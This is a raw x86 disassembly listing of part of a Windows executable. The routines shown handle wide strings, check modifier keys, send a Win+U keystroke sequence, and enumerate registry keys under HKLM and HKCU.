  405e5c:	int3   
  405e5d:	int3   
  405e5e:	mov    edi,edi
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	mov    edx,DWORD PTR [ebp+0xc]
  405e66:	push   ebx
  405e67:	push   esi
  405e68:	mov    esi,ecx
  405e6a:	push   edi
  405e6b:	test   edx,edx
  405e6d:	je     0x405ea5
  405e6f:	mov    ecx,edx
  405e71:	xor    ebx,ebx
  405e73:	lea    edi,[ecx+0x2]
  405e76:	mov    ax,WORD PTR [ecx]
  405e79:	add    ecx,0x2
  405e7c:	cmp    ax,bx
  405e7f:	jne    0x405e76
  405e81:	sub    ecx,edi
  405e83:	sar    ecx,1
  405e85:	lea    eax,[ecx*2+0x2]
  405e8c:	push   eax
  405e8d:	push   edx
  405e8e:	push   0x1
  405e90:	push   ebx
  405e91:	push   0x409070
  405e96:	push   DWORD PTR [esi]
  405e98:	call   DWORD PTR ds:0x40a10c
  405e9e:	pop    edi
  405e9f:	pop    esi
  405ea0:	pop    ebx
  405ea1:	pop    ebp
  405ea2:	ret    0xc
  405ea5:	mov    ecx,0x80004005
  405eaa:	call   0x403805
  405eaf:	int3   
  405eb0:	int3   
  405eb1:	int3   
  405eb2:	int3   
  405eb3:	int3   
  405eb4:	int3   
  405eb5:	mov    edi,edi
  405eb7:	push   ebp
  405eb8:	mov    ebp,esp
  405eba:	push   edi
  405ebb:	xor    edi,edi
  405ebd:	test   edx,edx
  405ebf:	je     0x405eec
  405ec1:	mov    eax,DWORD PTR [ebp+0xc]
  405ec4:	push   ebx
  405ec5:	push   esi
  405ec6:	mov    esi,0x7ffffffe
  405ecb:	sub    eax,ecx
  405ecd:	test   esi,esi
  405ecf:	je     0x405ee6
  405ed1:	movzx  ebx,WORD PTR [eax+ecx*1]
  405ed5:	test   bx,bx
  405ed8:	je     0x405ee6
  405eda:	mov    WORD PTR [ecx],bx
  405edd:	add    ecx,0x2
  405ee0:	dec    esi
  405ee1:	sub    edx,0x1
  405ee4:	jne    0x405ecd
  405ee6:	pop    esi
  405ee7:	pop    ebx
  405ee8:	test   edx,edx
  405eea:	jne    0x405ef4
  405eec:	sub    ecx,0x2
  405eef:	mov    edi,0x8007007a
  405ef4:	xor    eax,eax
  405ef6:	mov    WORD PTR [ecx],ax
  405ef9:	mov    eax,edi
  405efb:	pop    edi
  405efc:	pop    ebp
  405efd:	ret    0xc
  405f00:	int3   
  405f01:	int3   
  405f02:	int3   
  405f03:	int3   
  405f04:	int3   
  405f05:	mov    edi,edi
  405f07:	push   ebp
  405f08:	mov    ebp,esp
  405f0a:	sub    esp,0x1c4
  405f10:	mov    eax,ds:0x409004
  405f15:	xor    eax,ebp
  405f17:	mov    DWORD PTR [ebp-0x4],eax
  405f1a:	push   ebx
  405f1b:	push   esi
  405f1c:	push   edi
  405f1d:	mov    eax,0xa2
  405f22:	xor    ebx,ebx
  405f24:	push   eax
  405f25:	call   DWORD PTR ds:0x40a158
  405f2b:	xor    edi,edi
  405f2d:	mov    esi,0x8000
  405f32:	inc    edi
  405f33:	test   si,ax
  405f36:	je     0x405f3a
  405f38:	mov    ebx,edi
  405f3a:	mov    eax,0xa3
  405f3f:	push   eax
  405f40:	call   DWORD PTR ds:0x40a158
  405f46:	push   0x2
  405f48:	pop    edx
  405f49:	test   si,ax
  405f4c:	je     0x405f50
  405f4e:	or     ebx,edx
  405f50:	mov    eax,0xa4
  405f55:	push   eax
  405f56:	call   DWORD PTR ds:0x40a158
  405f5c:	test   si,ax
  405f5f:	je     0x405f64
  405f61:	or     ebx,0x4
  405f64:	mov    eax,0xa5
  405f69:	push   eax
  405f6a:	call   DWORD PTR ds:0x40a158
  405f70:	test   si,ax
  405f73:	je     0x405f78
  405f75:	or     ebx,0x8
  405f78:	mov    eax,0xa0
  405f7d:	push   eax
  405f7e:	call   DWORD PTR ds:0x40a158
  405f84:	test   si,ax
  405f87:	je     0x405f8c
  405f89:	or     ebx,0x10
  405f8c:	mov    eax,0xa1
  405f91:	push   eax
  405f92:	call   DWORD PTR ds:0x40a158
  405f98:	test   si,ax
  405f9b:	je     0x405fa0
  405f9d:	or     ebx,0x20
  405fa0:	and    DWORD PTR [ebp-0x1c4],0x0
  405fa7:	lea    eax,[ebp-0x1c0]
  405fad:	push   0x1bc
  405fb2:	push   0x0
  405fb4:	push   eax
  405fb5:	call   0x407e84
  405fba:	add    esp,0xc
  405fbd:	xor    ecx,ecx
  405fbf:	push   0x2
  405fc1:	pop    edx
  405fc2:	test   bl,0x1
  405fc5:	je     0x405fe1
  405fc7:	mov    eax,0xa2
  405fcc:	mov    DWORD PTR [ebp-0x1c4],edi
  405fd2:	mov    WORD PTR [ebp-0x1c0],ax
  405fd9:	mov    ecx,edi
  405fdb:	mov    DWORD PTR [ebp-0x1bc],edx
  405fe1:	push   0x3
  405fe3:	pop    esi
  405fe4:	test   bl,0x2
  405fe7:	je     0x40600b
  405fe9:	imul   eax,ecx,0x1c
  405fec:	mov    edx,0xa3
  405ff1:	push   0x2
  405ff3:	inc    ecx
  405ff4:	mov    WORD PTR [ebp+eax*1-0x1c0],dx
  405ffc:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  406003:	mov    DWORD PTR [ebp+eax*1-0x1bc],esi
  40600a:	pop    edx
  40600b:	test   bl,0x4
  40600e:	je     0x406032
  406010:	imul   eax,ecx,0x1c
  406013:	mov    esi,0xa4
  406018:	push   0x3
  40601a:	inc    ecx
  40601b:	mov    WORD PTR [ebp+eax*1-0x1c0],si
  406023:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  40602a:	mov    DWORD PTR [ebp+eax*1-0x1bc],edx
  406031:	pop    esi
  406032:	test   bl,0x8
  406035:	je     0x406059
  406037:	imul   eax,ecx,0x1c
  40603a:	mov    edx,0xa5
  40603f:	push   0x2
  406041:	inc    ecx
  406042:	mov    WORD PTR [ebp+eax*1-0x1c0],dx
  40604a:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  406051:	mov    DWORD PTR [ebp+eax*1-0x1bc],esi
  406058:	pop    edx
  406059:	test   bl,0x10
  40605c:	je     0x40607d
  40605e:	imul   eax,ecx,0x1c
  406061:	mov    esi,0xa0
  406066:	inc    ecx
  406067:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  40606e:	mov    WORD PTR [ebp+eax*1-0x1c0],si
  406076:	mov    DWORD PTR [ebp+eax*1-0x1bc],edx
  40607d:	test   bl,0x20
  406080:	je     0x4060a1
  406082:	imul   eax,ecx,0x1c
  406085:	mov    esi,0xa1
  40608a:	inc    ecx
  40608b:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  406092:	mov    WORD PTR [ebp+eax*1-0x1c0],si
  40609a:	mov    DWORD PTR [ebp+eax*1-0x1bc],edx
  4060a1:	imul   eax,ecx,0x1c
  4060a4:	push   0x5b
  4060a6:	pop    esi
  4060a7:	push   0x55
  4060a9:	pop    edx
  4060aa:	push   0x2
  4060ac:	and    DWORD PTR [ebp+eax*1-0x1bc],0x0
  4060b4:	inc    ecx
  4060b5:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  4060bc:	mov    WORD PTR [ebp+eax*1-0x1c0],si
  4060c4:	imul   eax,ecx,0x1c
  4060c7:	and    DWORD PTR [ebp+eax*1-0x1bc],0x0
  4060cf:	inc    ecx
  4060d0:	mov    WORD PTR [ebp+eax*1-0x1c0],dx
  4060d8:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  4060df:	imul   eax,ecx,0x1c
  4060e2:	inc    ecx
  4060e3:	mov    WORD PTR [ebp+eax*1-0x1c0],dx
  4060eb:	pop    edx
  4060ec:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  4060f3:	mov    DWORD PTR [ebp+eax*1-0x1bc],edx
  4060fa:	imul   eax,ecx,0x1c
  4060fd:	push   0x1c
  4060ff:	mov    DWORD PTR [ebp+eax*1-0x1c4],edi
  406106:	mov    WORD PTR [ebp+eax*1-0x1c0],si
  40610e:	mov    DWORD PTR [ebp+eax*1-0x1bc],edx
  406115:	lea    eax,[ebp-0x1c4]
  40611b:	push   eax
  40611c:	lea    eax,[ecx+0x1]
  40611f:	push   eax
  406120:	call   DWORD PTR ds:0x40a140
  406126:	mov    ecx,DWORD PTR [ebp-0x4]
  406129:	pop    edi
  40612a:	pop    esi
  40612b:	xor    ecx,ebp
  40612d:	pop    ebx
  40612e:	call   0x407750
  406133:	mov    esp,ebp
  406135:	pop    ebp
  406136:	ret    
  406137:	int3   
  406138:	int3   
  406139:	int3   
  40613a:	int3   
  40613b:	int3   
  40613c:	mov    edi,edi
  40613e:	push   ebp
  40613f:	mov    ebp,esp
  406141:	push   DWORD PTR [ebp+0x8]
  406144:	call   0x40397d
  406149:	xor    eax,eax
  40614b:	mov    DWORD PTR [ecx+0x80],0xa
  406155:	mov    DWORD PTR [ecx+0x6c],eax
  406158:	mov    DWORD PTR [ecx+0x70],eax
  40615b:	mov    DWORD PTR [ecx+0x74],eax
  40615e:	mov    DWORD PTR [ecx+0x78],eax
  406161:	mov    DWORD PTR [ecx+0x7c],eax
  406164:	mov    eax,ecx
  406166:	pop    ebp
  406167:	ret    0x4
  40616a:	int3   
  40616b:	int3   
  40616c:	int3   
  40616d:	int3   
  40616e:	int3   
  40616f:	mov    edi,edi
  406171:	push   edi
  406172:	mov    edi,ecx
  406174:	cmp    DWORD PTR [edi+0x74],0x0
  406178:	je     0x406194
  40617a:	push   esi
  40617b:	mov    esi,DWORD PTR [edi+0x6c]
  40617e:	jmp    0x40618f
  406180:	mov    ecx,DWORD PTR [esi+0x8]
  406183:	mov    esi,DWORD PTR [esi]
  406185:	test   ecx,ecx
  406187:	je     0x40618f
  406189:	push   ecx
  40618a:	call   0x403429
  40618f:	test   esi,esi
  406191:	jne    0x406180
  406193:	pop    esi
  406194:	lea    ecx,[edi+0x6c]
  406197:	call   0x4062b8
  40619c:	mov    ecx,edi
  40619e:	pop    edi
  40619f:	jmp    0x4039e5
  4061a4:	int3   
  4061a5:	int3   
  4061a6:	int3   
  4061a7:	int3   
  4061a8:	int3   
  4061a9:	push   0x9c
  4061ae:	mov    eax,0x4084f2
  4061b3:	call   0x407f14
  4061b8:	mov    edi,ecx
  4061ba:	mov    DWORD PTR [ebp-0x98],edi
  4061c0:	xor    esi,esi
  4061c2:	mov    DWORD PTR [ebp-0xa8],esi
  4061c8:	and    DWORD PTR [ebp-0xa4],esi
  4061ce:	and    DWORD PTR [ebp-0xa0],esi
  4061d4:	and    DWORD PTR [ebp-0x4],esi
  4061d7:	lea    eax,[ebp-0x94]
  4061dd:	and    DWORD PTR [ebp-0x94],esi
  4061e3:	push   eax
  4061e4:	push   0x20019
  4061e9:	push   esi
  4061ea:	push   0x401970
  4061ef:	push   0x80000002
  4061f4:	call   DWORD PTR ds:0x40a024
  4061fa:	test   eax,eax
  4061fc:	jne    0x406294
  406202:	mov    esi,DWORD PTR [ebp-0x94]
  406208:	lea    eax,[ebp-0x94]
  40620e:	xor    ebx,ebx
  406210:	mov    DWORD PTR [ebp-0xa8],esi
  406216:	xor    ecx,ecx
  406218:	push   ecx
  406219:	push   ecx
  40621a:	push   ecx
  40621b:	push   ecx
  40621c:	push   eax
  40621d:	lea    eax,[ebp-0x90]
  406223:	push   eax
  406224:	push   ecx
  406225:	jmp    0x40627c
  406227:	lea    ecx,[ebp-0x90]
  40622d:	call   0x402b01
  406232:	mov    DWORD PTR [ebp-0x9c],eax
  406238:	test   eax,eax
  40623a:	je     0x406266
  40623c:	push   ecx
  40623d:	push   DWORD PTR [edi+0x70]
  406240:	lea    eax,[ebp-0x9c]
  406246:	push   eax
  406247:	lea    ecx,[edi+0x6c]
  40624a:	call   0x40631d
  40624f:	mov    ecx,DWORD PTR [edi+0x70]
  406252:	test   ecx,ecx
  406254:	je     0x40625a
  406256:	mov    DWORD PTR [ecx],eax
  406258:	jmp    0x40625d
  40625a:	mov    DWORD PTR [edi+0x6c],eax
  40625d:	mov    DWORD PTR [edi+0x70],eax
  406260:	mov    edi,DWORD PTR [ebp-0x98]
  406266:	inc    ebx
  406267:	xor    eax,eax
  406269:	push   eax
  40626a:	push   eax
  40626b:	push   eax
  40626c:	push   eax
  40626d:	lea    eax,[ebp-0x94]
  406273:	push   eax
  406274:	lea    eax,[ebp-0x90]
  40627a:	push   eax
  40627b:	push   ebx
  40627c:	push   esi
  40627d:	mov    DWORD PTR [ebp-0x94],0x40
  406287:	call   DWORD PTR ds:0x40a0a0
  40628d:	cmp    eax,0x103
  406292:	jne    0x406227
  406294:	or     DWORD PTR [ebp-0x4],0xffffffff
  406298:	test   esi,esi
  40629a:	je     0x4062aa
  40629c:	push   esi
  40629d:	call   DWORD PTR ds:0x40a034
  4062a3:	and    DWORD PTR [ebp-0xa8],0x0
  4062aa:	lea    eax,[edi+0x6c]
  4062ad:	call   0x407eb4
  4062b2:	ret    
  4062b3:	int3   
  4062b4:	int3   
  4062b5:	int3   
  4062b6:	int3   
  4062b7:	int3   
  4062b8:	mov    edi,edi
  4062ba:	push   ebx
  4062bb:	push   edi
  4062bc:	mov    edi,ecx
  4062be:	xor    ebx,ebx
  4062c0:	jmp    0x4062e1
  4062c2:	mov    ecx,DWORD PTR [edi]
  4062c4:	test   ecx,ecx
  4062c6:	je     0x40630d
  4062c8:	mov    eax,DWORD PTR [ecx]
  4062ca:	mov    DWORD PTR [edi],eax
  4062cc:	mov    eax,DWORD PTR [edi+0x10]
  4062cf:	mov    DWORD PTR [ecx],eax
  4062d1:	sub    DWORD PTR [edi+0x8],0x1
  4062d5:	mov    DWORD PTR [edi+0x10],ecx
  4062d8:	jne    0x4062e1
  4062da:	mov    ecx,edi
  4062dc:	call   0x4062b8
  4062e1:	cmp    DWORD PTR [edi+0x8],ebx
  4062e4:	ja     0x4062c2
  4062e6:	mov    eax,DWORD PTR [edi+0xc]
  4062e9:	mov    DWORD PTR [edi],ebx
  4062eb:	mov    DWORD PTR [edi+0x4],ebx
  4062ee:	mov    DWORD PTR [edi+0x10],ebx
  4062f1:	test   eax,eax
  4062f3:	je     0x40630a
  4062f5:	push   esi
  4062f6:	mov    esi,DWORD PTR [eax]
  4062f8:	push   eax
  4062f9:	call   DWORD PTR ds:0x40a1e8
  4062ff:	mov    eax,esi
  406301:	pop    ecx
  406302:	test   esi,esi
  406304:	jne    0x4062f6
  406306:	mov    DWORD PTR [edi+0xc],ebx
  406309:	pop    esi
  40630a:	pop    edi
  40630b:	pop    ebx
  40630c:	ret    
  40630d:	mov    ecx,0x80004005
  406312:	call   0x403805
  406317:	int3   
  406318:	int3   
  406319:	int3   
  40631a:	int3   
  40631b:	int3   
  40631c:	int3   
  40631d:	mov    edi,edi
  40631f:	push   ebp
  406320:	mov    ebp,esp
  406322:	push   ecx
  406323:	push   esi
  406324:	mov    esi,ecx
  406326:	push   edi
  406327:	cmp    DWORD PTR [esi+0x10],0x0
  40632b:	jne    0x40635c
  40632d:	mov    edx,DWORD PTR [esi+0x14]
  406330:	push   ecx
  406331:	lea    ecx,[esi+0xc]
  406334:	call   0x405bde
  406339:	mov    edx,eax
  40633b:	test   edx,edx
  40633d:	je     0x406389
  40633f:	mov    ecx,DWORD PTR [esi+0x14]
  406342:	imul   eax,ecx,0xc
  406345:	add    eax,0xfffffff8
  406348:	add    edx,eax
  40634a:	jmp    0x406357
  40634c:	mov    eax,DWORD PTR [esi+0x10]
  40634f:	mov    DWORD PTR [edx],eax
  406351:	mov    DWORD PTR [esi+0x10],edx
  406354:	sub    edx,0xc
  406357:	sub    ecx,0x1
  40635a:	jns    0x40634c
  40635c:	mov    edx,DWORD PTR [esi+0x10]
  40635f:	mov    DWORD PTR [ebp-0x4],edx
  406362:	mov    edi,DWORD PTR [edx]
  406364:	test   edx,edx
  406366:	je     0x406370
  406368:	mov    eax,DWORD PTR [ebp+0x8]
  40636b:	mov    ecx,DWORD PTR [eax]
  40636d:	mov    DWORD PTR [edx+0x8],ecx
  406370:	mov    ecx,DWORD PTR [ebp+0xc]
  406373:	mov    eax,edx
  406375:	mov    DWORD PTR [esi+0x10],edi
  406378:	and    DWORD PTR [edx],0x0
  40637b:	mov    DWORD PTR [edx+0x4],ecx
  40637e:	inc    DWORD PTR [esi+0x8]
  406381:	pop    edi
  406382:	pop    esi
  406383:	mov    esp,ebp
  406385:	pop    ebp
  406386:	ret    0xc
  406389:	mov    ecx,0x8007000e
  40638e:	call   0x403805
  406393:	int3   
  406394:	int3   
  406395:	int3   
  406396:	int3   
  406397:	int3   
  406398:	int3   
  406399:	push   0x18
  40639b:	mov    eax,0x40852f
  4063a0:	call   0x407edc
  4063a5:	mov    edi,ecx
  4063a7:	call   0x404d2a
  4063ac:	test   eax,eax
  4063ae:	jne    0x4063c2
  4063b0:	push   0xffffffff
  4063b2:	call   DWORD PTR ds:0x40a060
  4063b8:	mov    eax,0x80004005
  4063bd:	jmp    0x4064e9
  4063c2:	xor    ecx,ecx
  4063c4:	call   0x406f40
  4063c9:	test   eax,eax
  4063cb:	je     0x4063b8
  4063cd:	xor    ebx,ebx
  4063cf:	mov    DWORD PTR [ebp-0x18],ebx
  4063d2:	mov    DWORD PTR [ebp-0x14],ebx
  4063d5:	mov    DWORD PTR [ebp-0x10],ebx
  4063d8:	jmp    0x4064b5
  4063dd:	mov    DWORD PTR [ebp-0x24],ebx
  4063e0:	mov    DWORD PTR [ebp-0x20],ebx
  4063e3:	mov    DWORD PTR [ebp-0x1c],ebx
  4063e6:	push   0x2001f
  4063eb:	lea    eax,[ebp-0x24]
  4063ee:	mov    BYTE PTR [ebp-0x4],0x1
  4063f2:	push   eax
  4063f3:	call   0x4065d9
  4063f8:	test   eax,eax
  4063fa:	js     0x4064fd
  406400:	lea    eax,[ebp-0x24]
  406403:	mov    ecx,edi
  406405:	push   eax
  406406:	lea    eax,[ebp-0x18]
  406409:	push   eax
  40640a:	call   0x40678b
  40640f:	test   eax,eax
  406411:	js     0x4064fd
  406417:	mov    ecx,DWORD PTR [edi]
  406419:	call   0x403f3d
  40641e:	mov    esi,DWORD PTR [eax]
  406420:	jmp    0x406440
  406422:	mov    ecx,DWORD PTR [esi+0x8]
  406425:	mov    esi,DWORD PTR [esi]
  406427:	call   0x402b01
  40642c:	test   eax,eax
  40642e:	je     0x4064f6
  406434:	cmp    DWORD PTR [eax+0x24],0x0
  406438:	jne    0x406472
  40643a:	cmp    DWORD PTR [eax+0x20],0x0
  40643e:	je     0x406472
  406440:	test   esi,esi
  406442:	jne    0x406422
  406444:	mov    BYTE PTR [ebp-0x4],bl
  406447:	cmp    DWORD PTR [ebp-0x24],esi
  40644a:	je     0x406458
  40644c:	push   DWORD PTR [ebp-0x24]
  40644f:	call   DWORD PTR ds:0x40a034
  406455:	mov    DWORD PTR [ebp-0x24],ebx
  406458:	or     DWORD PTR [ebp-0x4],0xffffffff
  40645c:	cmp    DWORD PTR [ebp-0x18],0x0
  406460:	je     0x40646e
  406462:	push   DWORD PTR [ebp-0x18]
  406465:	call   DWORD PTR ds:0x40a034
  40646b:	mov    DWORD PTR [ebp-0x18],ebx
  40646e:	xor    eax,eax
  406470:	jmp    0x4064e9
  406472:	mov    esi,DWORD PTR [ebp-0x18]
  406475:	push   ebx
  406476:	push   ebx
  406477:	push   0x5
  406479:	push   0x1
  40647b:	push   esi
  40647c:	call   DWORD PTR ds:0x40a09c
  406482:	test   eax,eax
  406484:	jne    0x4064ef
  406486:	mov    BYTE PTR [ebp-0x4],bl
  406489:	cmp    DWORD PTR [ebp-0x24],eax
  40648c:	je     0x40649a
  40648e:	push   DWORD PTR [ebp-0x24]
  406491:	call   DWORD PTR ds:0x40a034
  406497:	mov    DWORD PTR [ebp-0x24],ebx
  40649a:	or     DWORD PTR [ebp-0x4],0xffffffff
  40649e:	test   esi,esi
  4064a0:	je     0x4064ac
  4064a2:	push   esi
  4064a3:	call   DWORD PTR ds:0x40a034
  4064a9:	mov    DWORD PTR [ebp-0x18],ebx
  4064ac:	mov    DWORD PTR [ebp-0x18],ebx
  4064af:	mov    DWORD PTR [ebp-0x14],ebx
  4064b2:	mov    DWORD PTR [ebp-0x10],ebx
  4064b5:	mov    edx,0x20019
  4064ba:	mov    DWORD PTR [ebp-0x4],ebx
  4064bd:	lea    ecx,[ebp-0x18]
  4064c0:	call   0x406716
  4064c5:	test   eax,eax
  4064c7:	jns    0x4063dd
  4064cd:	mov    esi,DWORD PTR [ebp-0x18]
  4064d0:	mov    edi,0x80004005
  4064d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4064d9:	test   esi,esi
  4064db:	je     0x4064e7
  4064dd:	push   esi
  4064de:	call   DWORD PTR ds:0x40a034
  4064e4:	mov    DWORD PTR [ebp-0x18],ebx
  4064e7:	mov    eax,edi
  4064e9:	call   0x407e9b
  4064ee:	ret    
  4064ef:	mov    edi,0x80004005
  4064f4:	jmp    0x406505
  4064f6:	mov    edi,0x8007000e
  4064fb:	jmp    0x406502
  4064fd:	mov    edi,0x80004005
  406502:	mov    esi,DWORD PTR [ebp-0x18]
  406505:	mov    BYTE PTR [ebp-0x4],bl
  406508:	cmp    DWORD PTR [ebp-0x24],0x0
  40650c:	je     0x4064d5
  40650e:	push   DWORD PTR [ebp-0x24]
  406511:	call   DWORD PTR ds:0x40a034
  406517:	mov    DWORD PTR [ebp-0x24],ebx
  40651a:	jmp    0x4064d5
  40651c:	int3   
  40651d:	int3   
  40651e:	int3   
  40651f:	int3   
  406520:	int3   
  406521:	push   0x18
  406523:	mov    eax,0x40855f
  406528:	call   0x407edc
  40652d:	mov    esi,ecx
  40652f:	call   0x404d2a
  406534:	test   eax,eax
  406536:	je     0x406542
  406538:	mov    eax,0x80004005
  40653d:	jmp    0x4065ce
  406542:	xor    ebx,ebx
  406544:	mov    DWORD PTR [ebp-0x24],ebx
  406547:	mov    DWORD PTR [ebp-0x20],ebx
  40654a:	mov    DWORD PTR [ebp-0x1c],ebx
  40654d:	push   0x20019
  406552:	lea    eax,[ebp-0x24]
  406555:	mov    DWORD PTR [ebp-0x4],ebx
  406558:	push   eax
  406559:	call   0x4065d9
  40655e:	test   eax,eax
  406560:	jns    0x406569
  406562:	mov    esi,0x80004005
  406567:	jmp    0x4065b6
  406569:	mov    DWORD PTR [ebp-0x18],ebx
  40656c:	mov    DWORD PTR [ebp-0x14],ebx
  40656f:	mov    DWORD PTR [ebp-0x10],ebx
  406572:	mov    edx,0x2001f
  406577:	mov    BYTE PTR [ebp-0x4],0x1
  40657b:	lea    ecx,[ebp-0x18]
  40657e:	call   0x406716
  406583:	test   eax,eax
  406585:	js     0x40659c
  406587:	lea    eax,[ebp-0x18]
  40658a:	mov    ecx,esi
  40658c:	push   eax
  40658d:	lea    eax,[ebp-0x24]
  406590:	push   eax
  406591:	call   0x40678b
  406596:	mov    esi,ebx
  406598:	test   eax,eax
  40659a:	jns    0x4065a1
  40659c:	mov    esi,0x80004005
  4065a1:	mov    BYTE PTR [ebp-0x4],bl
  4065a4:	cmp    DWORD PTR [ebp-0x18],0x0
  4065a8:	je     0x4065b6
  4065aa:	push   DWORD PTR [ebp-0x18]
  4065ad:	call   DWORD PTR ds:0x40a034
  4065b3:	mov    DWORD PTR [ebp-0x18],ebx
  4065b6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4065ba:	cmp    DWORD PTR [ebp-0x24],0x0
  4065be:	je     0x4065cc
  4065c0:	push   DWORD PTR [ebp-0x24]
  4065c3:	call   DWORD PTR ds:0x40a034
  4065c9:	mov    DWORD PTR [ebp-0x24],ebx
  4065cc:	mov    eax,esi
  4065ce:	call   0x407e9b
  4065d3:	ret    
  4065d4:	int3   
  4065d5:	int3   
  4065d6:	int3   
  4065d7:	int3   
  4065d8:	int3   
  4065d9:	push   0xc
  4065db:	mov    eax,0x40858f
  4065e0:	call   0x407edc
  4065e5:	lea    eax,[ebp-0x14]
  4065e8:	push   eax
  4065e9:	call   0x404b42
  4065ee:	xor    ebx,ebx
  4065f0:	lea    eax,[ebp-0x10]
  4065f3:	mov    DWORD PTR [ebp-0x4],ebx
  4065f6:	mov    ecx,0x409110
  4065fb:	push   eax
  4065fc:	mov    DWORD PTR [ebp-0x10],ebx
  4065ff:	mov    DWORD PTR [ebp-0x18],ebx
  406602:	call   0x405dc5
  406607:	test   eax,eax
  406609:	js     0x4066f3
  40660f:	mov    ecx,DWORD PTR [ebp-0x14]
  406612:	lea    eax,[ebp-0x18]
  406615:	push   eax
  406616:	call   0x405dc5
  40661b:	test   eax,eax
  40661d:	js     0x4066f3
  406623:	mov    edi,DWORD PTR [ebp-0x18]
  406626:	add    edi,DWORD PTR [ebp-0x10]
  406629:	cmp    edi,DWORD PTR [ebp-0x10]
  40662c:	jb     0x4066f3
  406632:	mov    DWORD PTR [ebp-0x10],ebx
  406635:	push   edi
  406636:	lea    ecx,[ebp-0x10]
  406639:	mov    BYTE PTR [ebp-0x4],0x1
  40663d:	call   0x402acb
  406642:	test   al,al
  406644:	jne    0x406650
  406646:	mov    edi,0x8007000e
  40664b:	jmp    0x4066e1
  406650:	push   DWORD PTR [ebp-0x14]
  406653:	push   0x409110
  406658:	push   edi
  406659:	push   DWORD PTR [ebp-0x10]
  40665c:	call   0x405d14
  406661:	add    esp,0x10
  406664:	test   eax,eax
  406666:	jns    0x40666f
  406668:	mov    edi,0x80004005
  40666d:	jmp    0x4066e1
  40666f:	lea    eax,[ebp-0x18]
  406672:	mov    DWORD PTR [ebp-0x18],ebx
  406675:	push   eax
  406676:	push   DWORD PTR [ebp+0xc]
  406679:	push   ebx
  40667a:	push   DWORD PTR [ebp-0x10]
  40667d:	push   0x80000002
  406682:	call   DWORD PTR ds:0x40a024
  406688:	mov    edi,DWORD PTR [ebp+0x8]
  40668b:	mov    ecx,eax
  40668d:	test   ecx,ecx
  40668f:	jne    0x4066ac
  406691:	mov    ecx,ebx
  406693:	cmp    DWORD PTR [edi],ecx
  406695:	je     0x4066a3
  406697:	push   DWORD PTR [edi]
  406699:	call   DWORD PTR ds:0x40a034
  40669f:	mov    ecx,eax
  4066a1:	mov    DWORD PTR [edi],ebx
  4066a3:	mov    eax,DWORD PTR [ebp-0x18]
  4066a6:	mov    DWORD PTR [edi],eax
  4066a8:	test   ecx,ecx
  4066aa:	je     0x4066df
  4066ac:	mov    eax,DWORD PTR [ebp+0xc]
  4066af:	mov    edx,0x20006
  4066b4:	and    eax,edx
  4066b6:	cmp    eax,edx
  4066b8:	jne    0x4066d6
  4066ba:	lea    eax,[ebp-0x18]
  4066bd:	push   eax
  4066be:	push   ecx
  4066bf:	push   DWORD PTR [ebp+0xc]
  4066c2:	push   0x1
  4066c4:	push   ecx
  4066c5:	push   DWORD PTR [ebp-0x10]
  4066c8:	mov    ecx,edi
  4066ca:	push   0x80000002
  4066cf:	call   0x405df9
  4066d4:	mov    ecx,eax
  4066d6:	mov    edi,0x80004005
  4066db:	test   ecx,ecx
  4066dd:	jne    0x4066e1
  4066df:	mov    edi,ebx
  4066e1:	mov    BYTE PTR [ebp-0x4],bl
  4066e4:	push   DWORD PTR [ebp-0x10]
  4066e7:	call   DWORD PTR ds:0x40a1e8
  4066ed:	pop    ecx
  4066ee:	mov    DWORD PTR [ebp-0x10],ebx
  4066f1:	jmp    0x4066f8
  4066f3:	mov    edi,0x80004005
  4066f8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4066fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4066ff:	add    ecx,0xfffffff0
  406702:	call   0x403776
  406707:	mov    eax,edi
  406709:	call   0x407e9b
  40670e:	ret    0x8
  406711:	int3   
  406712:	int3   
  406713:	int3   
  406714:	int3   
  406715:	int3   
  406716:	mov    edi,edi
  406718:	push   ebp
  406719:	mov    ebp,esp
  40671b:	push   ecx
  40671c:	and    DWORD PTR [ebp-0x4],0x0
  406720:	lea    eax,[ebp-0x4]
  406723:	push   esi
  406724:	push   edi
  406725:	push   eax
  406726:	mov    edi,edx
  406728:	mov    esi,ecx
  40672a:	push   edi
  40672b:	push   0x0
  40672d:	push   0x409128
  406732:	push   0x80000001
  406737:	call   DWORD PTR ds:0x40a024
  40673d:	test   eax,eax
  40673f:	jne    0x406759
  406741:	cmp    DWORD PTR [esi],eax
  406743:	je     0x406750
  406745:	push   DWORD PTR [esi]
  406747:	call   DWORD PTR ds:0x40a034
  40674d:	and    DWORD PTR [esi],0x0
  406750:	mov    ecx,DWORD PTR [ebp-0x4]
  406753:	mov    DWORD PTR [esi],ecx
  406755:	test   eax,eax
  406757:	je     0x40677e
  406759:	lea    eax,[ebp-0x4]
  40675c:	push   eax
  40675d:	push   ecx
  40675e:	push   edi
  40675f:	push   0x1
  406761:	push   ecx
  406762:	push   0x409128
  406767:	push   0x80000001
  40676c:	mov    ecx,esi
  40676e:	call   0x405df9
  406773:	test   eax,eax
  406775:	je     0x40677e
  406777:	mov    eax,0x80004005
  40677c:	jmp    0x406780
  40677e:	xor    eax,eax
  406780:	pop    edi
  406781:	pop    esi
  406782:	mov    esp,ebp
  406784:	pop    ebp
  406785:	ret    
  406786:	int3   
  406787:	int3   
  406788:	int3   
  406789:	int3   
  40678a:	int3   
  40678b:	push   0x244
  406790:	mov    eax,0x4085d0
  406795:	call   0x407f14
  40679a:	mov    esi,ecx
  40679c:	mov    eax,DWORD PTR [ebp+0x8]
  40679f:	xor    ecx,ecx
  4067a1:	mov    DWORD PTR [ebp-0x24c],eax
  4067a7:	mov    eax,DWORD PTR [ebp+0xc]
  4067aa:	push   ecx
  4067ab:	mov    DWORD PTR [ebp-0x250],eax
  4067b1:	push   DWORD PTR [eax]
  4067b3:	call   DWORD PTR ds:0x40a098
  4067b9:	test   eax,eax
  4067bb:	je     0x4067c7
  4067bd:	mov    eax,0x80004005
